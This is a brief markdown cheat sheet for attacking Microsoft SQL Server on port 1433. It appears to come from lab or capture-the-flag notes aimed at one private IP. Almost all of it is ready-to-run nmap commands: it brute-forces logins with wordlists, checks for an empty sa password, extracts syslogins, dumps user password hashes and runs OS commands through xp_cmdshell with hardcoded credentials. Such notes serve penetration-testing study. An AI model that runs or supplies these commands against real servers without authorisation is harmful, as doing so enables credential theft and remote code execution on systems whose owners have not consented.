---
description: Cheatsheets for MSSQL
---

# 1433 - Pentesting MSSQL

### Nmap

```bash
nmap -sV 10.0.30.33
```

### Nmap Scripts

```bash
#Running ms-sql-info nmap script to discover MSSQL server information.
nmap --script ms-sql-info -p 1433 10.0.30.33
#Running ms-sql-ntlm-info script to disclose more information.
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 10.0.30.33
#Identifying valid MSSQL users and their passwords using provided username and password list.
nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 10.0.30.33
#Running ms-sql-empty-password nmap script to check if sa user is enabled without any password.
nmap -p 1433 --script ms-sql-empty-password 10.0.30.33
#Extracting sysusers from MSSQL and storing the output in a file i.e output.tx
nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" 10.0.30.33 -oN output.txt gvim output.txt
#Dump the hashes of MSSQL users
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria 10.0.30.33
#Execute a command using xp_cmdshell using Nmap script.
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" 10.0.30.33
```
